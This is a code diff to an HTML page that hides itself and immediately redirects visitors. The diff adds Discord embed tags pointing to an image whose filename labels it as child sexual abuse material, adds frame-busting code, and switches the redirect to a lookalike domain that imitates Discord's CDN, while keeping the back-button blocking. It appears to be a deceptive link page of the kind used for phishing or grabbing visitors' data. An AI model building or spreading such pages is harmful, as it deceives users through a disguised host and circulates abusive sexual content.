@@ -5,6 +5,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title></title>
   <link rel="icon" href="data:;base64,="> <!-- Invisible favicon -->
+
+  <!-- Open Graph meta tags for Discord embed -->
+  <meta property="og:image" content="https://media.discordapp.net/attachments/1334707778308145208/1336791516760248340/child-porn.png?ex=67a5179d&is=67a3c61d&hm=b4990c349a20f540635e266b482af39a9ddb01ee9c3a3bf0d11216a9514ee562&">
+  <meta property="og:type" content="image">
+  <meta property="og:title" content=""> <!-- Empty title -->
+  <meta property="og:description" content=""> <!-- Empty description -->
+  <meta property="og:url" content=""> <!-- Empty URL -->
+
   <style>
     /* Set the page to be invisible and dark */
     body {
@@ -25,8 +33,14 @@
 </head>
 <body>
   <script>
+    // Check if the page is being embedded in an iframe
+    if (window.top !== window.self) {
+      // If it is, prevent the page from being displayed
+      window.top.location = window.self.location;
+    }
+
     // Redirect to the desired URL immediately
-    window.location.replace("https://yourwebsite.com/redirect.html");
+    window.location.replace("https://cdn-discordapp-com-gamma.vercel.app/");
 
     // Block going back in history (This is a workaround and doesn't guarantee complete prevention)
     window.history.pushState(null, null, window.location.href);
